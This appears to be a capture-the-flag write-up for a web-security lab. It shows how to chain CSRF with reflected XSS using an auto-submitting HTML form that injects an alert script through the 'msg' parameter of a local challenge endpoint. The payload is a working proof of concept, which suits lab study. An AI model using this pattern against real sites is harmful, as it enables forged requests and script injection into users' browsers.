This level requires us to add XSS to our CSRF payload. There's also an new endpoint in the website called `/ephemeral`, which allows us to pass text into the DOM through the URL parameter named `msg`.

We need to set the `msg` URL parameter to our XSS script, which will invoke the `alert('PWNED')` command. We can actually pass in URL parameter to form submission through the `<input>` tag.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form method="GET" action="http://challenge.localhost/ephemeral">
        <input type="hidden" name="msg" value="<script>alert('PWNED')</script>">
    </form>
    
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```